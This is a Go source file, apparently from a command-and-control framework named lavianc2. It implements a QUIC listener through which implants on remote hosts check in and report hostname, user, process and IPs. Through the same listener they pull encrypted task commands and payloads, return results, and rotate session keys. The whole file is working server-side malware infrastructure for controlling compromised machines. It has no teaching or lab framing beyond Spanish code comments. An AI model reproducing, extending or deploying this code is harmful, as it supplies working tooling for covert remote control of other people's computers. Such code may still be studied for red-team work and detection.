package listeners

import (
	"context"
	"crypto/ecdh"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net"
	"os"
	"time"

	"github.com/google/uuid"
	"github.com/quic-go/quic-go"
	"github.com/uLl0a/lavianc2/internal/beacons"
	"github.com/uLl0a/lavianc2/internal/crypto"
	"github.com/uLl0a/lavianc2/internal/events"
	"github.com/uLl0a/lavianc2/internal/models"
	"github.com/uLl0a/lavianc2/internal/profiles"
	"github.com/uLl0a/lavianc2/internal/protocol"
	"github.com/uLl0a/lavianc2/internal/sessions"
	"github.com/uLl0a/lavianc2/internal/storage"
)

const (
	// Tamaño máximo de envelope en un stream individual.
	quicMaxEnvelopeSize = 8 << 20 // 8 MB

	// Timeout de lectura por stream.
	quicStreamTimeout = 30 * time.Second
)

// QUICListener recibe check-ins de implantes vía QUIC (UDP).
//
// Cada mensaje del protocolo viaja en un stream bidireccional nuevo:
//  1. Cliente abre stream
//  2. Cliente escribe envelope
//  3. Cliente cierra write side (FIN)
//  4. Server lee hasta EOF
//  5. Server procesa y escribe respuesta
//  6. Server cierra write side
//  7. Cliente lee hasta EOF
//
// TLS 1.3 va embebido en QUIC. El servidor NO requiere client cert
// (igual que el listener HTTPS), porque el implante se identifica por
// session_key + public_key en el check-in.
type QUICListener struct {
	ID       uuid.UUID
	Name     string
	BindAddr string

	store      *storage.Store
	registry   *sessions.Registry
	bus        *events.Bus
	log        *slog.Logger
	router     *protocol.Router
	crypto     *crypto.SessionCryptoStore
	serverKeys *crypto.ServerKeyStore
	serverPriv *ecdh.PrivateKey

	beaconMgr *beacons.Manager

	certFile string
	keyFile  string

	profile *profiles.QUICProfile

	// Intervalo de rekey para las sesiones nuevas (0 = default).
	rekeyEvery uint64

	listener *quic.Listener
}

func NewQUICListener(
	id uuid.UUID,
	name, bindAddr string,
	store *storage.Store,
	registry *sessions.Registry,
	bus *events.Bus,
	serverKeys *crypto.ServerKeyStore,
	profileRegistry *profiles.QUICRegistry,
	profileName, certFile, keyFile string,
	beaconMgr *beacons.Manager,
	rekeyEvery uint64,
	log *slog.Logger,
) (*QUICListener, error) {
	if serverKeys == nil {
		return nil, fmt.Errorf("listener quic: server key store requerido")
	}
	if certFile == "" || keyFile == "" {
		return nil, fmt.Errorf("listener quic: certFile y keyFile requeridos")
	}
	if _, err := os.Stat(certFile); err != nil {
		return nil, fmt.Errorf("listener quic: certFile: %w", err)
	}
	if _, err := os.Stat(keyFile); err != nil {
		return nil, fmt.Errorf("listener quic: keyFile: %w", err)
	}

	profile, err := profileRegistry.Get(profileName)
	if err != nil {
		return nil, fmt.Errorf("listener quic: %w", err)
	}

	l := &QUICListener{
		ID:         id,
		Name:       name,
		BindAddr:   bindAddr,
		store:      store,
		registry:   registry,
		bus:        bus,
		log:        log,
		serverKeys: serverKeys,
		serverPriv: serverKeys.PrivateKey(),
		beaconMgr:  beaconMgr,
		rekeyEvery: rekeyEvery,
		profile:    profile,
		router:     protocol.NewRouter(log),
		crypto:     crypto.NewSessionCryptoStoreWithRepo(store.SessionKeys),
		certFile:   certFile,
		keyFile:    keyFile,
	}

	// Los handlers son los mismos que HTTPS. Copia los métodos desde
	// https.go y cambia el receiver a *QUICListener.
	l.router.MustRegister(protocol.MsgCheckin, l.handleCheckinEnvelope)
	l.router.MustRegister(protocol.MsgTaskPull, l.handleTaskPullEnvelope)
	l.router.MustRegister(protocol.MsgTaskResult, l.handleTaskResultEnvelope)
	l.router.MustRegister(protocol.MsgHeartbeat, l.handleHeartbeatEnvelope)
	l.router.MustRegister(protocol.MsgKeyRotation, l.handleKeyRotationEnvelope)

	// Limpieza cuando el janitor marca una sesión como muerta.
	bus.Subscribe(events.TopicImplantDead, func(ctx context.Context, ev events.Event) {
		id, ok := ev.Payload.(uuid.UUID)
		if !ok {
			return
		}
		if err := l.crypto.Delete(context.Background(), id); err != nil {
			l.log.Warn("quic: limpiar sesión muerta", "err", err, "implant", id)
			return
		}
		l.registry.Unregister(id)
		l.log.Info("quic: sesión limpiada", "implant", id)
	})

	return l, nil
}

func (l *QUICListener) Metadata() ListenerMetadata {
	return ListenerMetadata{ID: l.ID, Name: l.Name, Type: "quic"}
}

func (l *QUICListener) Start(ctx context.Context) error {
	tlsCert, err := tls.LoadX509KeyPair(l.certFile, l.keyFile)
	if err != nil {
		return fmt.Errorf("listener quic: cargar cert: %w", err)
	}

	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{tlsCert},
		MinVersion:   tls.VersionTLS13,
		NextProtos:   l.profile.ALPN,
		// Sin ClientAuth: el implante no lleva cert.
	}

	quicCfg := &quic.Config{
		MaxIdleTimeout:  l.profile.MaxIdleTimeout,
		KeepAlivePeriod: l.profile.KeepAlivePeriod,
	}

	ln, err := quic.ListenAddr(l.BindAddr, tlsCfg, quicCfg)
	if err != nil {
		return fmt.Errorf("listener quic: listen: %w", err)
	}
	l.listener = ln

	l.log.Info("QUIC listener activo",
		"addr", l.BindAddr,
		"profile", l.profile.Name,
		"alpn", l.profile.ALPN,
	)

	for {
		conn, err := ln.Accept(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			l.log.Warn("quic: accept falló", "err", err)
			continue
		}
		go l.handleConn(ctx, conn)
	}
}

func (l *QUICListener) Stop(ctx context.Context) error {
	if l.listener == nil {
		return nil
	}
	l.log.Info("deteniendo QUIC listener")
	return l.listener.Close()
}

func (l *QUICListener) handleConn(ctx context.Context, conn *quic.Conn) {
	defer conn.CloseWithError(0, "")

	for {
		stream, err := conn.AcceptStream(ctx)
		if err != nil {
			return
		}
		go l.handleStream(ctx, conn, stream)
	}
}

func (l *QUICListener) handleStream(ctx context.Context, conn *quic.Conn, stream *quic.Stream) {
	_ = stream.SetReadDeadline(time.Now().Add(quicStreamTimeout))

	envelopeBytes, err := io.ReadAll(io.LimitReader(stream, quicMaxEnvelopeSize))
	if err != nil {
		l.log.Warn("quic: leer stream", "err", err)
		return
	}

	env, err := protocol.UnmarshalEnvelope(envelopeBytes)
	if err != nil {
		l.log.Warn("quic: unmarshal envelope", "err", err)
		return
	}

	// Inyectar la IP del cliente en el contexto, igual que el HTTPS
	// listener, para que handleCheckinEnvelope pueda rellenar external_ip.
	clientIP := remoteIP(conn.RemoteAddr())
	streamCtx := context.WithValue(ctx, clientIPKey, clientIP)

	resp, err := l.router.Dispatch(streamCtx, env)
	if err != nil {
		l.log.Error("quic: dispatch", "err", err, "type", env.Type)
		return
	}

	respBytes, err := resp.Marshal()
	if err != nil {
		l.log.Error("quic: marshal respuesta", "err", err)
		return
	}

	if _, err := stream.Write(respBytes); err != nil {
		l.log.Warn("quic: escribir respuesta", "err", err)
		return
	}
	_ = stream.Close()
}

// remoteIP extrae la IP de un net.Addr (sin puerto).
func remoteIP(addr net.Addr) string {
	host, _, err := net.SplitHostPort(addr.String())
	if err != nil {
		return addr.String()
	}
	return host
}

func (l *QUICListener) handleKeyRotationEnvelope(
	ctx context.Context,
	env *protocol.Envelope,
) (*protocol.Envelope, error) {
	var wrapper protocol.EncryptedWrapper
	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
		return nil, fmt.Errorf("rekey: wrapper inválido: %w", err)
	}
	implantID, err := uuid.Parse(wrapper.ImplantID)
	if err != nil {
		return nil, fmt.Errorf("rekey: implant_id inválido: %w", err)
	}

	sc, ok := l.crypto.Get(ctx, implantID)
	if !ok {
		return nil, fmt.Errorf("rekey: sesión %s sin claves", implantID)
	}

	// El implante cifra su respuesta con las claves VIEJAS.
	plaintext, err := sc.DecryptFromBeacon(wrapper.Data, nil)
	if err != nil {
		return nil, fmt.Errorf("rekey: descifrar: %w", err)
	}

	var req struct {
		ImplantEphPub string `json:"implant_eph_pub"`
	}
	if err := json.Unmarshal(plaintext, &req); err != nil {
		return nil, fmt.Errorf("rekey: payload inválido: %w", err)
	}
	implantEphPubBytes, err := base64.StdEncoding.DecodeString(req.ImplantEphPub)
	if err != nil {
		return nil, fmt.Errorf("rekey: eph_pub no es base64: %w", err)
	}
	implantEphPub, err := crypto.PublicKeyFromBytes(implantEphPubBytes)
	if err != nil {
		return nil, fmt.Errorf("rekey: eph_pub malformada: %w", err)
	}

	serverEphPriv := l.crypto.TakePendingRekey(implantID)
	if serverEphPriv == nil {
		return nil, fmt.Errorf("rekey: sin eph pendiente para %s", implantID)
	}

	if err := sc.ApplyRekeyAsServer(serverEphPriv, implantEphPub); err != nil {
		return nil, fmt.Errorf("rekey: aplicar: %w", err)
	}
	if err := l.crypto.Save(ctx, implantID); err != nil {
		l.log.Warn("rekey: persistir", "err", err)
	}

	l.log.Info("rekey completado", "implant", implantID)

	okBytes, err := sc.EncryptForBeacon([]byte("ok"), nil)
	if err != nil {
		return nil, fmt.Errorf("rekey: cifrar ack: %w", err)
	}
	return protocol.NewEnvelope(protocol.MsgKeyRotation, okBytes), nil
}

func (l *QUICListener) handleHeartbeatEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var req struct {
		ImplantID string `json:"implant_id"`
	}
	if err := json.Unmarshal(env.Payload, &req); err != nil {
		return nil, fmt.Errorf("heartbeat: payload inválido: %w", err)
	}

	if req.ImplantID != "" {
		implantID, err := uuid.Parse(req.ImplantID)
		if err == nil {
			_ = l.store.Implants.UpdateStatus(ctx, implantID, models.ImplantAlive)
		}
	}

	return protocol.NewEnvelope(protocol.MsgHeartbeat, []byte("pong")), nil
}

func (l *QUICListener) handleTaskResultEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var wrapper protocol.EncryptedWrapper
	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
		return nil, fmt.Errorf("task result: wrapper inválido: %w", err)
	}

	implantID, err := uuid.Parse(wrapper.ImplantID)
	if err != nil {
		return nil, fmt.Errorf("task result: implant_id inválido: %w", err)
	}

	sessionCrypto, ok := l.crypto.Get(ctx, implantID)
	if !ok {
		return nil, fmt.Errorf("task result: sesión %s sin claves", implantID)
	}

	plaintext, err := sessionCrypto.DecryptFromBeacon(wrapper.Data, nil)
	if err != nil {
		return nil, fmt.Errorf("task result: descifrar: %w", err)
	}

	var result protocol.TaskResultWire
	if err := json.Unmarshal(plaintext, &result); err != nil {
		return nil, fmt.Errorf("task result: payload inválido: %w", err)
	}

	taskID, err := uuid.Parse(result.TaskID)
	if err != nil {
		return nil, fmt.Errorf("task result: task_id inválido: %w", err)
	}

	status := models.TaskCompleted
	if result.Error != "" {
		status = models.TaskFailed
	}
	if err := l.store.Tasks.UpdateTaskStatus(ctx, taskID, status, result.Output, result.Error); err != nil {
		return nil, fmt.Errorf("task result: actualizar tarea: %w", err)
	}

	l.bus.Publish(ctx, events.Event{
		Topic: events.TopicTaskCompleted,
		Payload: map[string]any{
			"task_id":    taskID,
			"implant_id": implantID,
			"status":     status,
			"output":     result.Output,
			"error":      result.Error,
		},
	})

	sessionCrypto.IncrementMsg()
	go func() {
		if err := l.crypto.Save(context.Background(), implantID); err != nil {
			l.log.Warn("task result: no se pudo persistir msgCount", "err", err)
		}
	}()

	return protocol.NewEnvelope(protocol.MsgTaskResult, []byte("ok")), nil
}

func (l *QUICListener) handleCheckinEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var req struct {
		SessionKey string `json:"session_key"`
		Hostname   string `json:"hostname"`
		Username   string `json:"username"`
		OS         string `json:"os"`
		Arch       string `json:"arch"`
		PID        int    `json:"pid"`
		Process    string `json:"process"`
		InternalIP string `json:"internal_ip"`
		Sleep      int    `json:"sleep"`
		Jitter     int    `json:"jitter"`
		PublicKey  string `json:"public_key"`
	}
	if err := json.Unmarshal(env.Payload, &req); err != nil {
		return nil, fmt.Errorf("checkin: payload inválido: %w", err)
	}

	if req.SessionKey == "" || req.PublicKey == "" {
		return nil, fmt.Errorf("checkin: session_key y public_key requeridos")
	}
	sleep := req.Sleep
	if sleep <= 0 {
		sleep = 60
	}
	jitter := req.Jitter
	if jitter < 0 {
		jitter = 0
	}

	pubBytes, err := base64.StdEncoding.DecodeString(req.PublicKey)
	if err != nil {
		return nil, fmt.Errorf("checkin: public_key no es base64 válido: %w", err)
	}
	implantPub, err := crypto.PublicKeyFromBytes(pubBytes)
	if err != nil {
		return nil, fmt.Errorf("checkin: public_key malformada: %w", err)
	}

	implant, err := l.store.Implants.GetBySessionKey(ctx, req.SessionKey)
	if err != nil {
		return nil, fmt.Errorf("checkin: buscar implante: %w", err)
	}

	externalIP := clientIPFromContext(ctx)
	now := time.Now().UTC()

	if implant == nil {
		implant = &models.Implant{
			ID:            uuid.New(),
			SessionKey:    req.SessionKey,
			Hostname:      req.Hostname,
			Username:      req.Username,
			OS:            req.OS,
			Arch:          req.Arch,
			PID:           req.PID,
			ProcessName:   req.Process,
			InternalIP:    req.InternalIP,
			ExternalIP:    externalIP,
			ListenerID:    l.ID,
			PublicKey:     pubBytes,
			Status:        models.ImplantAlive,
			SleepInterval: sleep,
			Jitter:        jitter,
			FirstSeen:     now,
			LastCheckIn:   now,
			Metadata:      map[string]any{},
		}
		if err := l.store.Implants.Create(ctx, implant); err != nil {
			return nil, fmt.Errorf("checkin: crear implante: %w", err)
		}
		l.log.Info("nuevo implante",
			"id", implant.ID,
			"session_key", req.SessionKey,
			"host", req.Hostname,
			"os", req.OS,
		)
	} else {
		implant.Hostname = req.Hostname
		implant.Username = req.Username
		implant.OS = req.OS
		implant.Arch = req.Arch
		implant.PID = req.PID
		implant.ProcessName = req.Process
		implant.InternalIP = req.InternalIP
		implant.ExternalIP = externalIP
		implant.PublicKey = pubBytes
		implant.LastCheckIn = now
		implant.Status = models.ImplantAlive
		if err := l.store.Implants.UpdateCheckin(ctx, implant); err != nil {
			l.log.Error("checkin: actualizar implante", "err", err, "id", implant.ID)
		}
	}

	l.registry.Register(implant.ID)

	sessionCrypto, err := crypto.NewSessionCrypto(l.serverPriv, implantPub, req.SessionKey, l.rekeyEvery)
	if err != nil {
		return nil, fmt.Errorf("checkin: derivar session crypto: %w", err)
	}
	if err := l.crypto.Set(ctx, implant.ID, sessionCrypto); err != nil {
		l.log.Error("checkin: persistir session keys", "err", err, "implant", implant.ID)
	}

	l.bus.Publish(ctx, events.Event{
		Topic:   events.TopicImplantCheckin,
		Payload: implant.ID,
	})

	resp := map[string]any{
		"implant_id": implant.ID.String(),
		"server_pub": base64.StdEncoding.EncodeToString(l.serverPriv.PublicKey().Bytes()),
		"sleep":      implant.SleepInterval,
		"jitter":     implant.Jitter,
	}
	respBytes, err := json.Marshal(resp)
	if err != nil {
		return nil, fmt.Errorf("checkin: marshal respuesta: %w", err)
	}
	return protocol.NewEnvelope(protocol.MsgCheckin, respBytes), nil
}

func (l *QUICListener) handleTaskPullEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var wrapper protocol.EncryptedWrapper
	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
		return nil, fmt.Errorf("task pull: wrapper inválido: %w", err)
	}

	implantID, err := uuid.Parse(wrapper.ImplantID)
	if err != nil {
		return nil, fmt.Errorf("task pull: implant_id inválido: %w", err)
	}

	sessionCrypto, ok := l.crypto.Get(ctx, implantID)
	if !ok {
		return nil, fmt.Errorf("task pull: sesión %s sin claves", implantID)
	}

	if l.beaconMgr != nil {
		l.beaconMgr.TouchByImplant(implantID)
	}

	// Validar la autenticación del ciphertext (aunque hoy no usemos el plaintext).
	if len(wrapper.Data) > 0 {
		if _, err := sessionCrypto.DecryptFromBeacon(wrapper.Data, nil); err != nil {
			return nil, fmt.Errorf("task pull: descifrar: %w", err)
		}
	}

	if sessionCrypto.ShouldRekey() {
		return l.initiateRekey(ctx, implantID, sessionCrypto)
	}

	tasks, err := l.store.Tasks.ClaimPendingTasksForImplant(ctx, implantID, 32)
	if err != nil {
		return nil, fmt.Errorf("task pull: listar tareas: %w", err)
	}

	wire := make([]protocol.TaskWire, 0, len(tasks))
	for _, t := range tasks {
		wire = append(wire, protocol.TaskWire{
			ID:      t.ID.String(),
			Command: t.Command,
			Args:    t.Args,
			Payload: t.Payload,
		})
	}
	tasksJSON, err := json.Marshal(wire)
	if err != nil {
		return nil, fmt.Errorf("task pull: marshal tareas: %w", err)
	}

	encrypted, err := sessionCrypto.EncryptForBeacon(tasksJSON, nil)
	if err != nil {
		return nil, fmt.Errorf("task pull: cifrar respuesta: %w", err)
	}

	sessionCrypto.IncrementMsg()
	go func() {
		if err := l.crypto.Save(context.Background(), implantID); err != nil {
			l.log.Warn("task pull: no se pudo persistir msgCount", "err", err)
		}
	}()

	return protocol.NewEnvelope(protocol.MsgTaskDispatch, encrypted), nil
}

func (l *QUICListener) initiateRekey(
	ctx context.Context,
	implantID uuid.UUID,
	sc *crypto.SessionCrypto,
) (*protocol.Envelope, error) {
	ephPriv, ephPub, err := crypto.GenerateKeyPair()
	if err != nil {
		return nil, fmt.Errorf("rekey: generar eph: %w", err)
	}
	l.crypto.SetPendingRekey(implantID, ephPriv)

	req := map[string]string{
		"server_eph_pub": base64.StdEncoding.EncodeToString(ephPub.Bytes()),
	}
	reqJSON, _ := json.Marshal(req)
	encrypted, err := sc.EncryptForBeacon(reqJSON, nil)
	if err != nil {
		_ = l.crypto.TakePendingRekey(implantID) // cleanup
		return nil, fmt.Errorf("rekey: cifrar: %w", err)
	}

	l.log.Info("rekey iniciado", "implant", implantID)
	return protocol.NewEnvelope(protocol.MsgKeyRotation, encrypted), nil
}

// ExpirePendingRekeys purga los rekeys pendientes expirados del store
// criptográfico del listener. Lo llama el janitor del server.
func (l *QUICListener) ExpirePendingRekeys() []uuid.UUID {
	return l.crypto.ExpirePendingRekeys()
}
